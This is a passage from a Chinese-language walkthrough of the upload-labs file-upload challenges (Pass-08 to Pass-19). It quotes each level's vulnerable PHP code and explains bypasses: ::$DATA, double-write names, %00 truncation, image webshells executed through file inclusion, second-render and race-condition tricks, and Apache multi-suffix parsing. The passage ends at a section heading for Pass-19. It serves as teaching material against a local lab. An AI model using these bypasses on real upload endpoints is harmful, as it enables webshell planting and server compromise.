![](/img/posts/文件上传漏洞/1780665270786-30cc277f-9851-4531-9efe-51570d5dcab1.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 2、解题思路
1. 分析代码

```php
".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780665362628-dada11da-9777-441b-a807-e2694dd2fd62.png)

我们发现没有 $file_ext = str_ireplace('::$DATA', '', $file_ext); 去除字符串::$DATA 的函数。

 文件名+"::$DATA" ，会把::$DATA之后的数据当成⽂件流处理,不会检测后缀名   

### 3、操作
1. 上传文件，bp 抓包，修改

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780665502318-68e77e14-994a-4a19-8ccd-35acf20f6b19.png)

2. 访问

```php
http://127.0.0.1/upload/202606052118232914.php::$data
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780665532636-4dcee393-0357-4afa-8fe8-f602ed4b4fa7.png)

要把::$data 删掉，再次访问。

```php
http://127.0.0.1/upload/202606052118232914.php
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780665568402-c7f0bfbe-fbed-4819-a7b3-2daeaadc2aa5.png)

## Pass-09- 点 + 空格 + 点 + 空格
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780665597388-f311da44-a1a3-46fa-8d93-f70ac78c3e05.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 2、解题思路
1. 分析代码：和 Pass-04 的区别就是这一关无法用`.htaccess`配置文件，所以可以使用 Pass-04 的方法二，这里就不再赘述。

## Pass-10- 双写
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780666203443-943caf97-833f-4272-b7e7-3bb7ac620d5e.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 2、解题思路
1. 分析代码

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780666232747-ce6d6a9a-4b09-4da1-89fd-466a1543454b.png)

+ `trim()`：接收上传的原始文件名，并去掉首尾的空格。
+ `str_ireplace()`：PHP 中专门用于**字符串替换**的内置核心函数。只替换一次。
+ 补充：区分
    - `str_replace()`：**大小写敏感**。如果开发者用了这个函数，并且黑名单里只有 `"php"`，根本不需要用 `pphphp` 这种复杂的双写。直接传 `webshell.PhP` 就可以，因为小写的 `php` 根本匹配不到大写的 `PhP`。
    - `str_ireplace()`：**大小写不敏感**。遇到它，大小写混淆战术彻底失效（比如 `.PhP` 也会被它揪出来删掉），这时候就只能`pphphp` 双写嵌套

在这段代码中，如果存在于黑名单，会被替换成空格。由于只替换一次，所以可以双写

### 3、操作
1. 上传文件。bp 抓包，修改

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780666871480-5536f191-0a1a-4cf2-8e7e-cc1bd0b58736.png)

2. 访问;

```plain
http://127.0.0.1/upload/1.php
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780666903709-4e44271b-2f29-43d8-8f4e-9e2a27f26634.png)

## Pass-11-%00 截断
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780450052523-2501ebe8-7dc4-4fbf-9ac5-61308ef453d4.png)

### 2、解题思路
1. 分析源代码：
    1. 白名单校验：只允许上传 jpg、png、gif
    2. 对文件的保存路径（  $_GET['save_path']   ）可控，没有做过滤，直接信任拼接。
2. `%00` 截断的作用机制 ，是让底层函数遇到空字符（Null Byte）时以为字符串已经结束，从而强制丢弃了 `%00` 之后由服务器强制拼接的”随机数字、时间戳以及合法的 .jpg 后缀”。

### 3、操作：
1. 上传一句话木马（1.php）
2. 修改文件后缀，在 php 后面加上%00.jpg
3. 查看响应，文件上传成功
4. 访问 1.php（不能包含用于截断的部分）

```plain
http://127.0.0.1/upload/1.php
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780451716382-93e7b601-3f08-42b0-a063-8bf7167b154a.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780452901945-c9e0214e-4b06-480c-b54a-1a7de24c2313.png)

5. 为什么这里我访问图片地址却无法显示呢？

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780452432276-283a17c8-9f0c-407d-b1d9-cc7047cbb2f7.png)

因为我们使用了%00 截断，因此 jpg 图片根本就不存在

## Pass-12-%00 截断
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780453102930-f0fe5cb2-399d-493f-b07f-a8f91ca7ef33.png)

### 2、解题思路
和 Pass11 的区别在于，Pass12 对文件的保存路径是 $_POST['save_path']   

依旧用%00 截断方法

### 3、操作：
1. 上传一句话木马（1.php）
2. 修改文件后缀，在 php 后面加上%00.jpg
3. 查看响应，文件上传成功
4. 访问 1.php（不能包含用于截断的部分）

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780453415568-7d3dffb1-cfa9-4eb2-8580-393ae1ca75fd.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780453555647-ea6b590a-c4ec-4125-ba77-fc432e9804b5.png)

## Pass-13-图片马
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780453586910-519fb4a9-1199-4f5b-adc0-82f1661a4e02.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780454311989-629df7c9-2fbf-4571-a893-102f61deebe9.png)

```php
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

### 2、解题思路
1. 分析源代码：
    1. 文件头检测：`fread($file, 2)`，代码打开了我们上传的临时文件，并且只读取了最开头的 **2 个字节**。 
    2. `@unpack("C2chars", $bin)`，把读到的二进制数据转换成十进制数字。
    3. **白名单核对**：
    - `255216` (十六进制 `FF D8`) -> 判定为 **JPG**
    - `13780` (十六进制 `89 50`) -> 判定为 **PNG**
    - `7173` (ASCII 码 `G I`) -> 判定为 **GIF**
    4.  文件保存路径不可控，`$img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;` 所以不可以使用%00 截断

### 3、操作
1. 上传制作好的图片马
2. 查看文件名

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780454993317-6617cfb7-510d-42f2-93b5-d060c921ec73.png)

3. 使用文件包含漏洞，把图片马当作代码来执行。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780455125937-4e803386-3ab6-4688-a739-da17555974ad.png)

4. 访问

```php
http://127.0.0.1/include.php?file=upload/5120260603104828.png
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780455169402-9e544eb6-ee1a-43dc-86f9-07d7e18611ea.png)

## Pass-14-图片马
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780455275899-5ab52212-2c4d-4844-aba2-15a4b64d3f59.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780455302022-3bc5df5f-6a6a-479c-9549-2f7f426486a8.png)

```php
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

### 2、解题思路
1. 分析源代码
    1. 这段代码放弃了自己去读底层字节，而是调用了 PHP 内置的专业图像处理函数。核心防线有三道：
    2. `getimagesize()` 函数不仅会读取文件头（Magic Bytes），还会去解析图像的完整结构（长、宽、MIME 类型等）。如果随便拿个 `.php` 文件硬改后缀成 `.jpg`，或者用 010 Editor 只加两个字节的伪造头，在面对严格配置的 `getimagesize()` 时，极有可能会被直接识破并返回 `false`。
    3. `image_type_to_extension()`是**将一个 PHP 内部的“图像类型常量（整型 ID）”翻译成标准的“文件后缀名字符串”**。  

```plain
$info = getimagesize($filename);
$ext = image_type_to_extension($info[2]);
```

当 `getimagesize()` 成功扫描完一张合法图片后，它会返回一个数组。这个数组的**索引** `[2]`存放的就是代表图像真实类型的整型 ID（也就是 `IMAGETYPE_XXX` 常量）。

        * 如果扫描的是 **JPG**：`$info[2]` 的值是 `2`。
        * 如果扫描的是 **PNG**：`$info[2]` 的值是 `3`。
        * 如果扫描的是 **GIF**：`$info[2]` 的值是 `1`。

紧接着，把这个查出来的数字 `2`，塞给了 `image_type_to_extension(2)`。 这个函数一查内部字典，发现 `2` 对应的是 JPEG，于是直接吐出字符串 `'.jpeg'`。

    4.  文件保存路径不可控

### 3、操作
1. 上传制作好的图片马
2. 复制图像地址

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780457376779-1b59d0b4-e51b-453a-bd36-79faff074b12.png)

3. 使用文件包含漏洞，把图片马当作代码来执行。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780455125937-4e803386-3ab6-4688-a739-da17555974ad.png)

4. 访问

```php
http://127.0.0.1/include.php?file=upload/3520260603113051.png
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780457513228-f6a50d64-0f03-4d41-b0cf-b15da2676a5c.png)

## Pass-15-图片马
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780457617852-925886e4-3d1b-4f9f-bd00-e9947ce6277a.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780457636747-4b0a7df1-d3de-4f21-b7e3-7d759c12ed21.png)

```php
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

### 2、解题思路
1. 分析源代码：
    1. `exif_imagetype()` 只检查文件头的前几个字节  
    2. 文件上传路径不可控

### 3、操作
1. 上传制作好的图片马
2. 复制图像地址

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780457376779-1b59d0b4-e51b-453a-bd36-79faff074b12.png)

3. 使用文件包含漏洞，把图片马当作代码来执行。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780455125937-4e803386-3ab6-4688-a739-da17555974ad.png)

4. 访问

```php
http://127.0.0.1/include.php?file=upload/1220260603114237.png
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780458183538-b191c018-07ce-4c9b-8fa0-f4d89cd4ad0d.png)

## Pass-16 -**二次渲染**
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780458322061-0f05180c-123d-4a25-858b-1b183528bad8.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780458348231-73d5a846-e4bd-4ff4-a2e9-2f18c3ec930b.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```

### 2、解题思路
1. 分析源代码
    1.  检查了后缀名和 MIME 类型，可以通过抓包绕过
    2. `imagecreatefromjpeg(string $filename)`：由文件或 URL 创建一个新图象。`imagejpeg()`处理完内存数据后，把内存里的纯净像素重新保存成硬盘文件 。（jpeg、png、gif 都一样有这个系统函数）
    3.  `$im = imagecreatefromjpeg($target_path);` 这几个内置的 GD 库函数，**只把文件里符合合法图片规范的“像素数据”吸入内存**，构建成一个纯净的图像资源对象（`$im`）。 因此， 在尾部追加的 `<?php phpinfo(); ?>` 等一句话木马，在这里统统丢弃。 
    4. `imagejpeg($im, $img_path);`将被 `imagecreatefromjpeg` 抽提出来的、保存在内存中的**纯净像素资源**，封装成新的图片。
    5.  `unlink()`：**物理删除文件**的内置函数。在这里将带有木马的原始文件（`$target_path`）从硬盘上抹除。  

### 3、操作（GIF 渲染绕过）
1. 上传一张 png 图片马

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780502284563-e83fd0cc-a2b2-471b-b6bc-d5b5a7eceaf7.png)

这时候去访问图片地址是没有 phpinfo()的

```plain
http://127.0.0.1/include.php?file=upload/31915.png
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780502957497-49a633b6-f8ba-4664-86b1-2d6fb7302c18.png)

全是乱码，由刚刚的分析知道我们上传的图片马被删掉了，这是新生成的、没有一句话木马的图片。

2.  制作一个 gif 后缀的图片马。

```plain
copy image.gif /b + info.php /a aaa.gif
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780504752333-f5f8b30d-e2a8-49d7-b450-5ef5daa3f979.png)

3. 上传新制作的 gif 后缀的图片马。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780504828103-b835ea62-1ae2-4ac9-9456-cee45f371520.png)

明显感觉画质不太一样了

访问：

```plain
http://127.0.0.1/include.php?file=upload/333.gif
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780504893496-e9dc52c5-8958-4134-954f-bda5e493c96d.png)

还是没有。

再次保存新生成的图片。

4.  打开 010 Editor，把保存好的图片拖到 010 Editor 里面去。如下图：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780505161710-285561a8-5412-49d2-93f3-b1b8431edd9b.png)

5. 插入一句话木马，这里我是把末尾的 66 改成了一句话木马。

```plain
<?php phpinfo(); ?>
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780505219937-c1ed5b3f-a730-4227-bf6e-6ef2ae12357e.png)

保存。

6. 上传上一步保存的图片马

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780505410658-2d0bffad-8454-4473-8ff6-a203c9814bc0.png)

明显图片又不一样了。

7. 访问

```plain
http://127.0.0.1/include.php?file=upload/31287.gif
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780505528156-109e184c-c482-43d2-9c3b-a92c14f676a0.png)

## Pass-17-频繁访问
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780505894306-95e9f150-fe86-47d3-912b-06aaecb217b7.png)

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

### 2、解题思路
1. 分析代码
+ 先接收临时文件（`$temp_file`）后**直接把文件移动到正式 Web 目录。**
+ 再检查文件后缀是不是图片。
+ 发现是木马，通过代码执行删除（`unlink`）。

### 3、操作
1. 上传一句话木马，bp 抓包，发送到 intruder。 设置无限空载荷 。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780584997708-8e03968a-cbac-468e-9c49-703c25d8e581.png)

2.  频繁访问地址。

```plain
http://127.0.0.1/upload/info.php
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780585101669-ecb6e2ac-640c-44e9-b701-72a923a643ad.png)

## Pass-18-解析漏洞
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780585307889-e709180e-0047-4ded-8408-e82c89848d72.png)

```php
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};
```

### 2、解题思路
1. 分析代码
+ 规定了白名单，所以不可以传 php 文件

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780585411044-7b927738-3c87-4ac2-80f6-a6f06fc708c4.png)

+  先以【原文件名】移动到目标 Web 目录 ， 过了几毫秒，再把它重命名  

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780585996599-7fa7295e-18f3-4ce8-b781-c7410cd20d18.png)

漏洞点： 尽管在移动之前做过了后缀检查，但只要 `$this->move()` 成功，在 `$this->renameFile()` 还没有执行完毕的这万分之一秒内，文件在硬盘上是**以上传时的原名真实存在着**。  

+ pass-18 和 pass-17 的区别在于，pass-17 是先移动，再校验；而 pass-18 是先校验再移动。我们要先通过校验，才有机会去利用移动到重命名这个间隙存在的漏洞
+ 白名单中有一个特殊的后缀  .7z，这个靶场的服务器用的是 apache

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780586677222-13ba57ba-2cef-4edd-b1a5-38719cf3913d.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780587248968-835e50ea-51cc-46bb-b291-013794e4100d.png)

当 Apache 的引擎从右向左扫描文件名时，看到 `.7z` 发现不认识，它就不管了，直接往左看下一个。看到 `.php` 后，它立刻调用 PHP 解释器，把我们上传的的文件当做 PHP 代码给强行运行了。 

补充：`rar`, `7z` （Apache 默认不认识），如果换了环境 在 Nginx 下几乎是无解的 ， Nginx 极其严谨，绝对没有从右向左多后缀解析的毛病。  

### 3、操作
1.  利用 `.7z` 满足 PHP 代码层的白名单，成功上传一句话木马
2.  利用 Apache 的多后缀解析特性，让 Apache 跳过 `.7z`，认出并执行内部的 `.php`。  
3.  利用 Burp Suite 并发，在文件刚落地、还没被重命名成随机数字前访问到。

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780587734926-724d2759-1551-4c37-82dd-ccb274f73b0c.png)

4. 访问

```plain
http://127.0.0.1/upload/info.php.7z
或者
http://127.0.0.1/uploadinfo.php.7z
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780588114414-b27984fd-c7a4-4156-9337-d8ee443ce4f7.png)

## Pass-19-黑名单
### 1、题目
<!-- 这是一张图片，ocr 内容为： -->
![](/img/posts/文件上传漏洞/1780588239201-14e2ffc4-323e-4b5d-a393-a4145e1afe43.png)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

### 2、解题思路
1. 分析代码：
+ POST 传参，上传的 `save_name` 可以自由控制 。在这段代码中，文件名 `$file_name` 是直接通过 `$_POST['save_name']` 获取的，这与之前的 `$_FILES` 有着本质的区别！ 文件最后叫什么名字，是由 `$_FILES['name']`（浏览器受限提供）或者服务器自己生成（如时间戳）来决定的，控制权在**系统手里**。 到了这一关，允许用户自定义文件名，把文件命名的控制权直接交给了 `$_POST`
+  解题核心在于，要不在黑名单里，还要能让文件最终以 `.php` 的真实身份落地。那就要利用`/./`，后缀是空（`""`）。空后缀确实不在黑名单范围内   

### 3、操作
#### 方法一：%00 截断
